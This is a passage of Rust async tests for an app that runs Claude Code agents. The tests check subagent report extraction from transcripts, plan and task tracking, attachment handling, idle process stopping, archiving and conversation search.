        .background = true;
    h.core.agent(&id).unwrap().lock().meta.terminal = true;
    assert_eq!(
        refused(
            h.core
                .message_subagent_from(&id, &call, "En vue Claude Code", Some("agent-2"))
                .await
                .unwrap_err()
        ),
        "En vue Claude Code, on écrit à un sous-agent depuis l’interface de Claude Code."
    );
    assert_eq!(h.stdin_messages(&r).len(), all, "nothing else was sent");
}

/// A message of the assistant in a subagent's transcript, as Claude Code writes it.
fn sidechain_entry(uuid: &str, blocks: Value) -> String {
    json!({
        "isSidechain": true, "type": "assistant", "uuid": uuid,
        "timestamp": "2026-10-16T10:00:00.000Z",
        "message": { "role": "assistant", "content": blocks },
    })
    .to_string()
}

/// A subagent's hand-back in a transcript.
fn handback_entry(uuid: &str, message: &str) -> String {
    sidechain_entry(
        uuid,
        json!([{ "type": "tool_use", "id": format!("hb-{uuid}"), "name": "SubagentHandback", "input": { "message": message } }]),
    )
}

/// The call of a subagent in the agent's conversation, as the stream leaves it.
fn subagent_call(
    name: &str,
    call: &str,
    status: &str,
    report: Option<&str>,
    result: Option<&str>,
) -> Value {
    let mut item = json!({
        "kind": "tool", "id": call, "name": name, "status": status,
        "input": { "description": "Chercher", "prompt": "Cherche." }, "ts": 1,
    });
    if let Some(report) = report {
        item["report"] = json!(report);
    }
    if let Some(text) = result {
        item["result"] = json!({ "isError": status == "error", "text": text });
    }
    item
}

#[tokio::test]
async fn the_report_of_a_subagent_is_the_one_its_call_keeps_else_the_result_of_one_that_ended_in_the_foreground(
) {
    let h = harness("esc107-report");
    let (p, _) = h.project(false).await;
    let id = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    let launched = "Async agent launched successfully.\nagentId: bg1";
    for item in [
        // Its report, trimmed, whatever its result says.
        subagent_call(
            "Agent",
            "c-report",
            "ok",
            Some("  **Cause trouvée**\n\nDétails.  "),
            Some(launched),
        ),
        // The call is named `Task` in other versions of Claude Code.
        subagent_call(
            "Task",
            "c-both",
            "ok",
            Some("Le rapport"),
            Some("Le résultat"),
        ),
        // A report that says nothing is none: the result of a subagent that ended in the foreground.
        subagent_call(
            "Agent",
            "c-blank",
            "ok",
            Some("  \n "),
            Some("  Le résultat final  "),
        ),
        subagent_call("Agent", "c-plain", "ok", None, Some("Le résultat seul")),
        // The words of a launch in the background are no report.
        subagent_call(
            "Agent",
            "c-launched",
            "ok",
            None,
            Some(&format!("  {launched}")),
        ),
        // Nor the result of a call that failed, was interrupted or runs, nor an empty one.
        subagent_call("Agent", "c-error", "error", None, Some("Boom")),
        subagent_call("Agent", "c-interrupted", "interrupted", None, Some("Coupé")),
        subagent_call("Agent", "c-running", "running", None, Some("En cours")),
        subagent_call("Agent", "c-empty", "ok", None, Some("   ")),
        subagent_call("Agent", "c-no-result", "ok", None, None),
        // A call of another tool is no subagent, whatever it holds.
        subagent_call("Bash", "c-bash", "ok", Some("Pas un sous-agent"), Some("x")),
    ] {
        h.core
            .agent(&id)
            .unwrap()
            .lock()
            .conv
            .apply(&ConvOp::Append { item });
    }
    let report = |call: &str| {
        let (c, id, call) = (h.core.clone(), id.clone(), call.to_string());
        async move { c.subagent_report(&id, &call).await.unwrap() }
    };
    assert_eq!(
        report("c-report").await.as_deref(),
        Some("**Cause trouvée**\n\nDétails.")
    );
    assert_eq!(report("c-both").await.as_deref(), Some("Le rapport"));
    assert_eq!(
        report("c-blank").await.as_deref(),
        Some("Le résultat final")
    );
    assert_eq!(report("c-plain").await.as_deref(), Some("Le résultat seul"));
    for none in [
        "c-launched",
        "c-error",
        "c-interrupted",
        "c-running",
        "c-empty",
        "c-no-result",
        "c-bash",
        "c-nobody",
    ] {
        assert_eq!(report(none).await, None, "{none}");
    }
    // An agent that is gone is told.
    assert!(h.core.subagent_report("nobody", "c-report").await.is_err());
}

#[tokio::test]
async fn in_the_claude_code_view_the_report_of_a_subagent_is_the_last_handback_of_its_transcript() {
    let h = harness("esc107-report-tui");
    let (p, _) = h.project(false).await;
    let id = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    let handle = h.core.agent(&id).unwrap();
    // The process `create_agent` warms attaches when it is up, and attaching interrupts the rows
    // the plan has running: it is up before the plan below is made (macOS took longer, ESC-96).
    h.wait("the warmed process", |h| {
        h.core.agent(&id).unwrap().lock().proc.is_some()
    })
    .await;
    // The agent's transcript, and its subagents' beside it.
    let root = h.dir.join("claude-view");
    let subs = root.join("s9").join("subagents");
    std::fs::create_dir_all(&subs).unwrap();
    std::fs::write(root.join("s9.jsonl"), "").unwrap();
    let launched = "Async agent launched successfully.\nagentId: bg1";
    {
        let mut rt = handle.lock();
        rt.meta.terminal = true;
        rt.meta.transcript_read = Some((root.join("s9.jsonl").to_string_lossy().into(), 0));
        rt.meta.plan = Some(crate::plan::PlanState {
            agents: ["c1", "c2", "c3", "c4"]
                .iter()
                .map(|call| crate::plan::SubAgent {
                    id: call.to_string(),
                    title: "Lent".into(),
                    background: true,
                    task_id: Some(format!("t-{call}")),
                    started_at: 1,
                    ..Default::default()
                })
                .collect(),
            ..Default::default()
        });
        for (call, report) in [
            ("c1", None),
            ("c2", Some("Le rapport de son appel")),
            ("c3", None),
        ] {
            rt.conv.apply(&ConvOp::Append {
                item: subagent_call("Agent", call, "ok", report, Some(launched)),
            });
        }
    }
    let write = |task: &str, lines: &[String]| {
        std::fs::write(
            subs.join(format!("agent-{task}.jsonl")),
            lines.join("\n") + "\n",
        )
        .unwrap();
    };
    let report = |call: &str| {
        let (c, id, call) = (h.core.clone(), id.clone(), call.to_string());
        async move { c.subagent_report(&id, &call).await.unwrap() }
    };
    // The last hand-back that says something, the ones before it and a blank one after it passed.
    write(
        "t-c1",
        &[
            sidechain_entry("u0", json!([{ "type": "text", "text": "Je cherche." }])),
            handback_entry("u1", "Premier rapport"),
            handback_entry("u2", "  Dernier rapport\n\nAvec des détails.  "),
            handback_entry("u3", "   "),
        ],
    );
    assert_eq!(
        report("c1").await.as_deref(),
        Some("Dernier rapport\n\nAvec des détails.")
    );
    // The report its call keeps comes first, as in the window.
    write("t-c2", &[handback_entry("u1", "Celui du transcript")]);
    assert_eq!(
        report("c2").await.as_deref(),
        Some("Le rapport de son appel")
    );
    // A subagent that handed nothing back yet, or whose transcript is not there (yet): none.
    write(
        "t-c3",
        &[sidechain_entry(
            "u1",
            json!([{ "type": "text", "text": "Je cherche." }]),
        )],
    );
    assert_eq!(report("c3").await, None);
    assert_eq!(report("c4").await, None);
    // Outside that view the transcript is nobody's to read: the stream has the report on the call.
    handle.lock().meta.terminal = false;
    assert_eq!(report("c1").await, None);
    assert_eq!(
        report("c2").await.as_deref(),
        Some("Le rapport de son appel")
    );
}

/// What Claude Code 2.1.300 wrote of a real subagent the user stopped in its interface (it ends
/// on the marker of the interruption).
const STOPPED_SIDECHAIN: &str = include_str!("../../tests/fixtures/real-sidechain.jsonl");

/// An agent in the Claude Code view whose plan has the subagent `c1`, running in the background,
/// and whose files are `STOPPED_SIDECHAIN`: its id, and the transcript file of the subagent.
async fn agent_with_a_subagent_stopped_in_the_interface(h: &Harness) -> (String, PathBuf) {
    let (p, _) = h.project(false).await;
    let id = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    let handle = h.core.agent(&id).unwrap();
    // The process `create_agent` warms attaches when it is up, and attaching interrupts the rows
    // the plan has running: it is up before the plan below is made (macOS took longer, ESC-96).
    h.wait("the warmed process", |h| {
        h.core.agent(&id).unwrap().lock().proc.is_some()
    })
    .await;
    let root = h.dir.join("claude-view");
    let subs = root.join("s9").join("subagents");
    std::fs::create_dir_all(&subs).unwrap();
    std::fs::write(root.join("s9.jsonl"), "").unwrap();
    let file = subs.join("agent-a3c004cb08b483eb9.jsonl");
    std::fs::write(&file, STOPPED_SIDECHAIN).unwrap();
    {
        let mut rt = handle.lock();
        rt.meta.terminal = true;
        rt.meta.transcript_read = Some((root.join("s9.jsonl").to_string_lossy().into(), 0));
        rt.meta.plan = Some(crate::plan::PlanState {
            agents: vec![crate::plan::SubAgent {
                id: "c1".into(),
                title: "Lent".into(),
                background: true,
                task_id: Some("a3c004cb08b483eb9".into()),
                started_at: 1,
                ..Default::default()
            }],
            ..Default::default()
        });
        rt.conv.apply(&ConvOp::Append {
            item: subagent_call(
                "Agent",
                "c1",
                "ok",
                None,
                Some("Async agent launched successfully.\nagentId: a3c004cb08b483eb9"),
            ),
        });
    }
    (id, file)
}

/// How many times the window was sent the agent `id`.
fn agent_told(h: &Harness, id: &str) -> usize {
    h.events
        .lock()
        .iter()
        .filter(|e| e["type"] == "agent" && e["agent"]["id"] == id)
        .count()
}

#[tokio::test]
async fn reading_the_report_of_a_subagent_changes_nothing_even_when_its_files_show_it_stopped() {
    use crate::plan::RunStatus;
    let h = harness("esc107-report-real");
    let (id, file) = agent_with_a_subagent_stopped_in_the_interface(&h).await;
    let status = || h.agent(&id).plan.unwrap().agents[0].status;
    let call = || h.items(&id).into_iter().find(|i| i["id"] == "c1").unwrap();
    assert_eq!(status(), RunStatus::Running);
    let told = agent_told(&h, &id);
    // It handed nothing back, and its files say the user stopped it: the report is none, and its
    // row stays as it is. Reading changes nothing, the window is told nothing.
    assert_eq!(h.core.subagent_report(&id, "c1").await.unwrap(), None);
    assert_eq!(status(), RunStatus::Running);
    assert!(call()["run"].is_null(), "{}", call());
    assert_eq!(agent_told(&h, &id), told);
    // A hand-back after that is its report, and reading it changes nothing either.
    std::fs::write(
        &file,
        format!(
            "{STOPPED_SIDECHAIN}\n{}\n",
            handback_entry("u9", "Rapport tardif")
        ),
    )
    .unwrap();
    for _ in 0..2 {
        assert_eq!(
            h.core.subagent_report(&id, "c1").await.unwrap().as_deref(),
            Some("Rapport tardif")
        );
    }
    assert_eq!(status(), RunStatus::Running);
    assert_eq!(agent_told(&h, &id), told);
}

#[tokio::test]
async fn the_windows_read_of_a_subagents_transcript_still_ends_its_row_when_its_files_show_it_stopped(
) {
    use crate::agent::sidechain::Ended;
    use crate::plan::RunStatus;
    let h = harness("esc107-transcript-real");
    let (id, _) = agent_with_a_subagent_stopped_in_the_interface(&h).await;
    let status = || h.agent(&id).plan.unwrap().agents[0].status;
    // A report read before changes nothing for the window that comes after it.
    assert_eq!(h.core.subagent_report(&id, "c1").await.unwrap(), None);
    assert_eq!(status(), RunStatus::Running);
    let told = agent_told(&h, &id);
    let read = h
        .core
        .subagent_transcript(&id, "c1", None)
        .unwrap()
        .unwrap();
    assert_eq!(read.ended, Some(Ended::Stopped));
    assert_eq!(status(), RunStatus::Stopped);
    let call = h.items(&id).into_iter().find(|i| i["id"] == "c1").unwrap();
    assert_eq!(call["run"]["status"], "stopped");
    assert_eq!(
        agent_told(&h, &id),
        told + 1,
        "the window is sent the agent"
    );
    // Over, the report is read as before.
    assert_eq!(h.core.subagent_report(&id, "c1").await.unwrap(), None);
    assert_eq!(agent_told(&h, &id), told + 1);
}

#[tokio::test]
async fn a_superpowers_run_with_a_task_list_goes_from_pending_tasks_to_done_with_its_subagents() {
    use crate::plan::{PlanSource, RunStatus, TaskStatus::*};
    let h = harness("p4-run");
    let (p, r) = h.project(false).await;
    h.core.plan_scan_ms.store(0, Ordering::Release);
    let id = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    h.core
        .send_message(&id, "plan superpowers".into(), vec![])
        .await
        .unwrap();

    // The third task waits for an answer: the first two are done, it is under way, and one
    // subagent goes on in the background.
    h.answer_the_question(&id).await;
    let plan = h.agent(&id).plan.expect("a plan");
    assert_eq!(plan.source, Some(PlanSource::Tools));
    assert_eq!(h.statuses_of(&id), [Done, Done, InProgress]);
    assert_eq!(plan.tasks[2].title, "Brancher dans l’interface");
    assert_eq!(
        plan.launched, 5,
        "two per task done, and the one in the background"
    );
    let running: Vec<_> = plan
        .agents
        .iter()
        .filter(|a| a.status == RunStatus::Running)
        .collect();
    assert_eq!(running.len(), 1);
    assert!(running[0].background);
    assert_eq!(running[0].title, "Surveiller la suite de tests");

    h.end_of_the_run(&id).await;
    // The background subagent ends by itself, after the turn.
    h.wait("the end of the background subagent", |h| {
        h.agent(&id)
            .plan
            .is_some_and(|p| p.agents.iter().all(|a| a.status != RunStatus::Running))
    })
    .await;
    // And the files are read for the plan's name.
    h.wait("the plan's title", |h| {
        h.agent(&id).plan.is_some_and(|p| p.title.is_some())
    })
    .await;
    let plan = h.agent(&id).plan.unwrap();
    assert_eq!(plan.source, Some(PlanSource::Tools));
    assert_eq!(h.statuses_of(&id), [Done, Done, Done]);
    assert_eq!(plan.title.as_deref(), Some("Démo"));
    assert_eq!(
        plan.plan_file.as_deref(),
        Some("docs/superpowers/plans/2026-10-10-demo.md")
    );
    // Three implementers, three reviewers and the one in the background; the workflow is none.
    assert_eq!((plan.launched, plan.agents.len()), (7, 7));
    let foreground = |a: &&crate::plan::SubAgent| !a.background;
    assert_eq!(plan.agents.iter().filter(foreground).count(), 6);
    assert!(plan
        .agents
        .iter()
        .filter(foreground)
        .all(|a| a.status == RunStatus::Done && a.tokens == Some(1500)));
    for n in 1..=3 {
        for what in ["Implémenter", "Relire"] {
            let row = plan
                .agents
                .iter()
                .find(|a| a.title == format!("{what} la tâche {n}"))
                .unwrap_or_else(|| panic!("{what} {n}"));
            assert_eq!(row.plan_task.as_deref(), Some(n.to_string().as_str()));
            assert_eq!(row.kind.as_deref(), Some("general-purpose"));
            // The tools it used, as its result totals them: three for the implementer.
            assert_eq!(row.tools, if what == "Relire" { 2 } else { 3 });
        }
    }
    assert_eq!(plan.workflows.len(), 1);
    let flow = &plan.workflows[0];
    assert_eq!(flow.name.as_deref(), Some("revue-finale"));
    assert_eq!(flow.status, RunStatus::Done);
    assert_eq!((flow.tools, flow.tokens), (5, 640));
    assert_eq!(flow.now, None);

    // What the window was told on the way, in order.
    let sent = h.plans_sent(&id);
    let pending = first_plan(&sent, |p| {
        (0..3).all(|n| has_task_status(p, n, "pending")) && p["tasks"][3].is_null()
    })
    .expect("three tasks to do");
    let started = first_plan(&sent, |p| has_task_status(p, 0, "inProgress"))
        .expect("the first one under way");
    let working = first_plan(&sent, |p| {
        has_agent(p, |a| {
            a["status"] == "running"
                && a["planTask"] == "1"
                && a["doing"].as_str().is_some_and(|d| d.contains("slugify"))
        })
    })
    .expect("a subagent at work on the first task, with what it does");
    let finished =
        first_plan(&sent, |p| has_task_status(p, 0, "done")).expect("the first one done");
    assert!(pending < started && started < working && working < finished);
    // Every task done, and only the background subagent running, until its notification.
    assert!(first_plan(&sent, |p| {
        (0..3).all(|n| has_task_status(p, n, "done"))
            && p["agents"]
                .as_array()
                .unwrap()
                .iter()
                .filter(|a| a["status"] == "running")
                .map(|a| a["background"].clone())
                .collect::<Vec<_>>()
                == [json!(true)]
    })
    .is_some());
    // The workflow was seen at work, with its phase.
    assert!(sent.iter().any(|p| p["workflows"][0]["status"] == "running"
        && p["workflows"][0]["now"] == "Relecture : style"));

    // It was launched with the task list tools; the agent saved its plan with itself.
    assert_eq!(
        h.launch_log(&r).last().map(|v| v["todoTools"].clone()),
        Some(json!("1"))
    );
    assert!(h.core.agent(&id).unwrap().lock().meta.plan.is_some());
}

#[tokio::test]
async fn a_superpowers_run_without_a_task_list_is_read_from_the_plan_and_the_ledger() {
    use crate::plan::{PlanSource, RunStatus, TaskStatus::*};
    let h = harness("p4-run-no-list");
    let (p, r) = h.project(false).await;
    h.core.plan_scan_ms.store(0, Ordering::Release);
    // The setting is off: no task tool reaches the agent (the fake is told so by its environment),
    // and what it does is all there is: the plan, the ledger, the calls of its subagents.
    change_settings(&h, |s| s.todo_tools = false);
    let id = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    h.core
        .send_message(&id, "plan superpowers sans liste".into(), vec![])
        .await
        .unwrap();

    h.wait("the plan and the ledger read", |h| {
        h.statuses_of(&id) == [Done, Done, InProgress]
    })
    .await;
    let plan = h.agent(&id).plan.expect("a plan");
    assert_eq!(plan.source, Some(PlanSource::Plan));
    assert_eq!(plan.title.as_deref(), Some("Démo"));
    assert_eq!(
        plan.plan_file.as_deref(),
        Some("docs/superpowers/plans/2026-10-10-demo.md")
    );
    let titles: Vec<_> = plan.tasks.iter().map(|t| t.title.as_str()).collect();
    assert_eq!(
        titles,
        [
            "Écrire la fonction",
            "Écrire les tests",
            "Brancher dans l’interface"
        ]
    );
    // The steps the plan counts: none done.
    assert!(plan.tasks.iter().all(|t| t.steps == Some((0, 2))));
    h.answer_the_question(&id).await;
    h.end_of_the_run(&id).await;
    h.wait("every task done", |h| {
        h.statuses_of(&id) == [Done, Done, Done]
    })
    .await;
    // The run ended as the skills end one: its workspace is removed, and the plan stays as it ended
    // (the files it reads are gone, and say nothing).
    assert!(!r.join(".superpowers/sdd/2026-10-10-demo").exists());
    h.wait("the end of the background subagent", |h| {
        h.agent(&id)
            .plan
            .is_some_and(|p| p.agents.iter().all(|a| a.status != RunStatus::Running))
    })
    .await;
    let plan = h.agent(&id).plan.unwrap();
    assert_eq!(plan.source, Some(PlanSource::Plan));
    assert_eq!(plan.launched, 7);
    // The subagents of the third task are tied to it by the brief their prompt names.
    for what in ["Implémenter", "Relire"] {
        let row = plan
            .agents
            .iter()
            .find(|a| a.title == format!("{what} la tâche 3"))
            .unwrap();
        assert_eq!(row.plan_task.as_deref(), Some("3"));
        assert_eq!(row.status, RunStatus::Done);
    }
    assert_eq!(plan.workflows.len(), 1);

    // The agent called no task tool at all, and the tools were not given to it.
    let tools: Vec<_> = h
        .items(&id)
        .iter()
        .filter(|i| i["kind"] == "tool")
        .filter_map(|i| i["name"].as_str().map(str::to_string))
        .collect();
    assert!(!tools.is_empty());
    assert!(tools.iter().all(|n| !n.starts_with("Task")), "{tools:?}");
    assert!(h.plans_sent(&id).iter().all(|p| p["source"] != "tools"));
    assert_eq!(
        h.launch_log(&r).last().map(|v| v["todoTools"].clone()),
        Some(Value::Null)
    );
}

#[tokio::test]
async fn a_run_interrupted_in_its_first_moments_ends_its_turn_once() {
    let h = harness("p4-run-stopped-early");
    let (p, _) = h.project(false).await;
    let id = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    h.core
        .send_message(&id, "plan superpowers".into(), vec![])
        .await
        .unwrap();
    // The first words of the run are out: it is still writing its plan, before the first task.
    h.wait("the first words", |h| {
        h.items(&id).iter().any(|i| i["kind"] == "text")
    })
    .await;
    h.core.interrupt(&id).await.unwrap();
    h.end_of_the_run(&id).await;
    // The fake went on to the next frame it had in hand, which it must not have: one turn's end.
    tokio::time::sleep(Duration::from_millis(600)).await;
    let turns = h.items(&id).iter().filter(|i| i["kind"] == "turn").count();
    assert_eq!(turns, 1);
    assert!(h.agent(&id).plan.is_none_or(|p| p.agents.is_empty()));
}

#[tokio::test]
async fn a_turn_cut_in_the_middle_of_a_subagent_leaves_it_interrupted() {
    use crate::plan::{RunStatus, TaskStatus::*};
    let h = harness("p4-run-cut");
    let (p, _) = h.project(false).await;
    h.core.plan_scan_ms.store(0, Ordering::Release);
    let id = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    h.core
        .send_message(&id, "plan superpowers interrompu".into(), vec![])
        .await
        .unwrap();
    h.wait("the subagent interrupted", |h| {
        h.agent(&id)
            .plan
            .is_some_and(|p| p.agents.iter().any(|a| a.status == RunStatus::Interrupted))
    })
    .await;
    h.end_of_the_run(&id).await;
    let plan = h.agent(&id).plan.unwrap();
    // The implementer of the first task, and nothing else: it was cut before it came back.
    assert_eq!(plan.launched, 1);
    assert_eq!(plan.agents.len(), 1);
    assert_eq!(plan.agents[0].title, "Implémenter la tâche 1");
    assert_eq!(plan.agents[0].status, RunStatus::Interrupted);
    assert_eq!(plan.agents[0].doing, None);
    assert!(plan.agents[0].ended_at.is_some());
    // The tasks stay where they were.
    assert_eq!(h.statuses_of(&id), [InProgress, Pending, Pending]);
    assert!(plan.workflows.is_empty());
    // Saved with the agent as it is.
    let saved = h.core.agent(&id).unwrap().lock().meta.plan.clone().unwrap();
    assert_eq!(saved.agents[0].status, RunStatus::Interrupted);
}

#[tokio::test]
async fn attached_files_reach_claude_as_content_blocks() {
    let h = harness("attach");
    let (p, r) = h.project(false).await;
    let id = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    let pdf = Attachment {
        name: "rapport.pdf".into(),
        media_type: "application/pdf".into(),
        data: "JVBERi0xLjQK".into(),
    };
    h.core
        .send_message(&id, "Résume".into(), vec![pdf])
        .await
        .unwrap();
    h.wait("turn end", |h| {
        h.items(&id).iter().any(|i| i["kind"] == "turn") && !h.agent(&id).status.is_active()
    })
    .await;
    let sent = h
        .stdin_messages(&r)
        .pop()
        .expect("message written to stdin");
    assert_eq!(
        sent["message"]["content"],
        json!([
            { "type": "document", "title": "rapport.pdf",
              "source": { "type": "base64", "media_type": "application/pdf", "data": "JVBERi0xLjQK" } },
            { "type": "text", "text": "Résume" },
        ])
    );
    let user = h
        .items(&id)
        .into_iter()
        .find(|i| i["kind"] == "user")
        .unwrap();
    assert_eq!(user["files"], json!(["rapport.pdf"]));
}

#[tokio::test]
async fn an_unsupported_file_is_refused_before_it_reaches_claude() {
    let h = harness("attach-refused");
    let (p, r) = h.project(false).await;
    let id = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    let zip = Attachment {
        name: "sources.zip".into(),
        media_type: "application/zip".into(),
        data: "UEsDBA==".into(),
    };
    let e = h
        .core
        .send_message(&id, "Regarde".into(), vec![zip])
        .await
        .unwrap_err();
    assert!(e.to_string().contains("sources.zip"), "{e}");
    assert!(h.stdin_messages(&r).is_empty());
    assert!(h.items(&id).iter().all(|i| i["kind"] != "user"));
}

#[tokio::test]
async fn idle_stop_is_silent_and_the_next_message_resumes_the_session() {
    let h = harness("idle");
    let (p, r) = h.project(false).await;
    let id = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    h.turn(&id, "Premier").await;
    let session = h.agent(&id).session_id.unwrap();

    h.core.agent(&id).unwrap().lock().meta.last_activity = 0;
    h.core.stop_idle_processes();
    h.wait("idle stop", |h| !h.alive(&id)).await;
    tokio::time::sleep(Duration::from_millis(400)).await;
    assert_eq!(h.agent(&id).status, AgentStatus::Done);
    assert!(
        h.error_notices(&id).is_empty(),
        "{:?}",
        h.error_notices(&id)
    );

    h.turn(&id, "Second").await;
    assert_eq!(h.agent(&id).status, AgentStatus::Done);
    assert!(h
        .launches(&r)
        .last()
        .unwrap()
        .contains(&format!("--resume={session}")));
}

#[tokio::test]
async fn stopping_a_warmed_agent_that_never_ran_a_turn_is_silent() {
    let h = harness("warm");
    let (p, _) = h.project(false).await;
    let id = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    h.wait("warm-up", |h| h.alive(&id)).await;
    h.core.agent(&id).unwrap().lock().meta.last_activity = 0;
    h.core.stop_idle_processes();
    h.wait("idle stop", |h| !h.alive(&id)).await;
    tokio::time::sleep(Duration::from_millis(400)).await;
    assert_eq!(h.agent(&id).status, AgentStatus::Idle);
    assert!(
        h.error_notices(&id).is_empty(),
        "{:?}",
        h.error_notices(&id)
    );
}

#[tokio::test]
async fn an_agent_with_a_command_running_in_the_background_is_not_idle_stopped() {
    use crate::plan::RunStatus;
    let h = harness("esc14-idle-background");
    let (p, _) = h.project(false).await;
    let id = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    h.core
        .send_message(&id, "commande de fond 60s".into(), vec![])
        .await
        .unwrap();
    let row = h.bg_task(&id, "Ticker", false).await;
    assert_eq!(row.status, RunStatus::Running);
    // The turn is over, the command is not: it lives in the agent's process.
    h.wait("its turn over", |h| {
        h.agent(&id).status == AgentStatus::Done
    })
    .await;
    h.core.agent(&id).unwrap().lock().meta.last_activity = 0;
    h.core.stop_idle_processes();
    tokio::time::sleep(Duration::from_millis(400)).await;
    assert!(h.alive(&id), "a command in the background is not idle");

    // Once it is over, nothing is left to keep the process for.
    h.core.stop_bg_task(&id, &row.id).await.unwrap();
    h.bg_task_status(&id, &row.id, RunStatus::Stopped).await;
    // (Claude Code opens a turn to tell the agent: the stop waits for it to be over.)
    h.wait("idle stop", |h| {
        h.core.agent(&id).unwrap().lock().meta.last_activity = 0;
        h.core.stop_idle_processes();
        !h.alive(&id)
    })
    .await;
}

#[tokio::test]
async fn an_agent_waiting_for_a_wake_up_of_its_session_is_not_idle_stopped() {
    use crate::plan::{PlanState, Wake};
    let h = harness("esc138-idle-wake");
    let (p, _) = h.project(false).await;
    let id = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    h.wait("warm-up", |h| h.alive(&id)).await;
    // A job of its session (`CronCreate`) fires in its process only: stopping it would lose it.
    let wake = |at: i64| PlanState {
        wakes: vec![Wake {
            id: "j1".into(),
            at,
            ..Wake::default()
        }],
        ..PlanState::default()
    };
    {
        let handle = h.core.agent(&id).unwrap();
        let mut rt = handle.lock();
        rt.meta.plan = Some(wake(now_ms() + 3_600_000));
        rt.meta.last_activity = 0;
    }
    h.core.stop_idle_processes();
    tokio::time::sleep(Duration::from_millis(300)).await;
    assert!(h.alive(&id), "a wake-up to come holds the process");
    // It fired: nothing is left to keep the process for.
    h.core.agent(&id).unwrap().lock().meta.plan = Some(wake(now_ms() - 1));
    h.core.stop_idle_processes();
    h.wait("idle stop", |h| !h.alive(&id)).await;
}

#[tokio::test]
async fn a_freshly_started_process_is_not_idle_stopped() {
    let h = harness("fresh");
    let (p, _) = h.project(false).await;
    let id = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    // The warm-up of the agent just made is waited for and its process idle-stopped first: started
    // before `last_activity` was set back, it is what `ensure_process` would find, and the idle stop
    // would rightly stop it.
    h.wait("warm-up", |h| h.alive(&id)).await;
    h.core.agent(&id).unwrap().lock().meta.last_activity = 0;
    h.core.stop_idle_processes();
    h.wait("idle stop", |h| !h.alive(&id)).await;
    h.core.ensure_process(&id).await.unwrap();
    h.core.stop_idle_processes();
    tokio::time::sleep(Duration::from_millis(300)).await;
    assert!(h.alive(&id));
}

/// What the board's scheduling passes do (they run on the application's runtime, which outlives
/// the test): start an agent's process. On Windows each process holds two threads of that
/// runtime's blocking pool (512 at most) to read its output, so the processes left by the tests
/// that ended pile up to the pool's end, and what runs next (a `git`, a new agent) waits for a
/// thread that never comes.
#[tokio::test]
async fn a_process_started_in_the_background_stops_with_the_harness_that_owns_it() {
    let h = harness("harness-stops-processes");
    let (p, _) = h.project(false).await;
    let id = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    let core = h.core.clone();
    let started = id.clone();
    tauri::async_runtime::spawn(async move { core.ensure_process(&started).await.map(|_| ()) })
        .await
        .unwrap()
        .unwrap();
    let process = h.core.agent(&id).unwrap().lock().proc.clone().unwrap();
    assert!(process.is_alive());
    // The test is over.
    drop(h);
    assert!(
        process.wait_exit(Duration::from_secs(20)).await,
        "the process is still running after its harness is gone"
    );
}

/// The warm-up of a new agent (`Core::warm`) is such a task too: it can start after the core was
/// stopped, and nothing would stop that process then.
#[tokio::test]
async fn no_agent_process_starts_once_the_core_is_stopped() {
    let h = harness("harness-no-late-start");
    let (p, _) = h.project(false).await;
    let id = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    h.wait("the warm-up", |h| h.alive(&id)).await;
    h.core.stop_for_good();
    assert!(!h.alive(&id));
    let Err(refused) = h.core.ensure_process(&id).await else {
        panic!("a process started");
    };
    assert_eq!(
        refused.to_string(),
        "Escouade se ferme : aucun agent ne démarre."
    );
    assert!(!h.alive(&id));
}

#[tokio::test]
async fn archiving_is_silent_and_a_restored_agent_resumes() {
    let h = harness("archive");
    let (p, r) = h.project(false).await;
    let id = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    h.turn(&id, "Premier").await;
    let session = h.agent(&id).session_id.unwrap();
    h.core.archive_agent(&id, true).await.unwrap();
    h.wait("archived", |h| !h.alive(&id)).await;
    tokio::time::sleep(Duration::from_millis(400)).await;
    assert!(h.error_notices(&id).is_empty());
    h.core.archive_agent(&id, false).await.unwrap();
    h.turn(&id, "Retour").await;
    assert!(h
        .launches(&r)
        .last()
        .unwrap()
        .contains(&format!("--resume={session}")));
}

#[tokio::test]
async fn searches_the_conversations_of_the_agents_archived_ones_included_when_asked() {
    let h = harness("conv-search");
    let (p, _) = h.project(false).await;
    let id = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    // Its log is being written by the agent, alive, as it is read.
    h.turn(&id, "Ajoute la pagination à l'événement").await;
    // Named after that message (ESC-156): the hits say the name it keeps.
    h.wait("its name", |h| h.agent(&id).named).await;
    let found = h.core.search_conversations("EVENEMENT", Some(&p.id), true);
    // Claude's answer (the fake one repeats the message: "Bonjour, tu as dit : …", cut short
    // before the match), then the message.
    let snippets: Vec<&str> = found.hits.iter().map(|x| x.snippet.as_str()).collect();
    assert_eq!(
        snippets,
        [
            "…: Ajoute la pagination à l'événement",
            "Ajoute la pagination à l'événement"
        ]
    );
    let hit = &found.hits[1];
    assert_eq!(
        (hit.agent_id.as_str(), hit.project_id.as_str()),
        (id.as_str(), p.id.as_str())
    );
    assert_eq!(hit.agent_name, h.agent(&id).name);
    assert!(!hit.archived);
    assert!(h
        .core
        .search_conversations("evenement", Some("ailleurs"), true)
        .hits
        .is_empty());
    h.core.archive_agent(&id, true).await.unwrap();
    assert!(h
        .core
        .search_conversations("evenement", None, false)
        .hits
        .is_empty());
    let found = h.core.search_conversations("evenement", None, true);
    assert!(found.hits.iter().any(|x| x.agent_id == id && x.archived));
}

#[tokio::test]
async fn archiving_a_running_agent_ends_what_it_was_doing() {
    let h = harness("archive-live");
    let (p, _) = h.project(false).await;
    let id = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    h.wait("warm-up", |h| h.alive(&id)).await;
    let agent = h.core.agent(&id).unwrap();
    // A turn in flight whose end will never be heard: nothing more comes from a detached process.
    if let Some(p) = agent.lock().detach() {
        p.kill();
    }
    {
        let mut rt = agent.lock();
